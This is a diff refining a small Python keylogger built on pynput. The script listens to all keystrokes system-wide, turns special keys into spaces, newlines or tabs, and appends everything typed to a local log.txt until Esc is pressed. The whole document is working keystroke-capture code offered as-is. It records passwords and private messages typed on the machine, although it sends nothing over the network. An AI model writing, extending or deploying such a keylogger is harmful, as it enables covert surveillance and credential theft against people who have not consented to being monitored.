@@ -1,25 +1,34 @@
 from pynput import keyboard
+from datetime import datetime
 
 log_file = "log.txt"
 
-def write_file(key):
+def format_key(key):
     key = str(key).replace("'", "")
 
     if key == "Key.space":
-        key = " "
+        return " "
     elif key == "Key.enter":
-        key = "\n"
+        return "\n"
+    elif key == "Key.tab":
+        return "\t"
+    elif key == "Key.backspace":
+        return ""
     elif key == "Key.esc":
         return False
     elif "Key" in key:
-        key = ""
-
-    with open(log_file, "a") as f:
-        f.write(key)
+        return ""
+    else:
+        return key
 
 def on_press(key):
-    if write_file(key) == False:
+    formatted = format_key(key)
+
+    if formatted == False:
         return False
+
+    with open(log_file, "a") as f:
+        f.write(formatted)
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
